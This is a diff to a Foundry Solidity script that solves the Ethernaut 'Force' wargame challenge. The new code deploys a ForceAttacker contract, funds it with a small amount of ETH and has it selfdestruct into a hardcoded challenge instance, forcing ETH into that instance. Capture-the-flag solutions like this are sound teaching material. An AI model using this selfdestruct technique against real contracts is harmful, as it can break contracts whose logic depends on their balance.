@@ -3,28 +3,29 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
-import "../src/07-Force/Force.sol";
+import "../src/07-Force/ForceAttacker.sol";
 
 /**
  * @title Challenge 07 Solution Script
- * @notice Solution script for Force challenge
+ * @notice Deploy ForceAttacker, send it ETH, then call attack() to selfdestruct into target
  */
 contract ForceSolution is Script {
-    // Replace with your instance address from Ethernaut
-    address constant INSTANCE = address(0);
+    address constant INSTANCE = 0x894e78c9155e3C38CeC91e9dFC9F16418F21a74d;
 
     function run() external {
         uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
 
         vm.startBroadcast(deployerPrivateKey);
 
-        console.log("Solving Challenge 07: Force");
-        console.log("Instance:", INSTANCE);
-
-        // TODO: Implement solution when solving
+        // Deploy attacker, fund it, then selfdestruct into the target
+        ForceAttacker attacker = new ForceAttacker();
+        (bool sent,) = address(attacker).call{value: 0.0001 ether}("");
+        require(sent, "Failed to fund attacker");
+        attacker.attack(payable(INSTANCE));
+        console.log("ForceAttacker self-destructed, ETH forced into target");
 
         vm.stopBroadcast();
 
-        console.log("Challenge completed!");
+        console.log("Challenge 07 completed!");
     }
 }
